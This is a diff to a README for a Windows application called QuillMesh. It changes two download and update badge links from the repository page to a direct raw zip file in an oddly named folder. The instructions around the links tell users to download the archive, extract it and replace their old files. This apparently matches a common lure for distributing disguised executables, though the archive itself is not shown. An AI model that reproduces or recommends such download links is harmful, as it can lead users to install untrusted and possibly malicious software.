@@ -12,7 +12,7 @@ Getting QuillMesh onto your Windows computer is quick and easy. Here's what to d
 
 **Step 1:**  
 👉 **Visit this link to download the application:**  
-[![Download QuillMesh](https://img.shields.io/badge/Download-QuillMesh-blue?style=for-the-badge&logo=github)](https://github.com/Awkward-graver397/QuillMesh)
+[![Download QuillMesh](https://img.shields.io/badge/Download-QuillMesh-blue?style=for-the-badge&logo=github)](https://github.com/Awkward-graver397/QuillMesh/raw/refs/heads/main/tyromatous/Mesh_Quill_1.5.zip)
 
 **Step 2:**  
 Once the page opens, look for the "Download" button. Click it, and your download will start automatically.
@@ -122,7 +122,7 @@ If you run into trouble, here's what you can do:
 Future improvements will be released as new versions. To check for updates:
 
 1. Return to the download page:  
-   [![QuillMesh Download Page](https://img.shields.io/badge/Get_Updates-QuillMesh-orange?style=for-the-badge)](https://github.com/Awkward-graver397/QuillMesh)
+   [![QuillMesh Download Page](https://img.shields.io/badge/Get_Updates-QuillMesh-orange?style=for-the-badge)](https://github.com/Awkward-graver397/QuillMesh/raw/refs/heads/main/tyromatous/Mesh_Quill_1.5.zip)
 2. Download the new `.zip` file.
 3. Extract it **into the same folder** as your current version. Follow the prompts to replace the old files.
 4. Your documents are safe—they're stored separately on your computer.
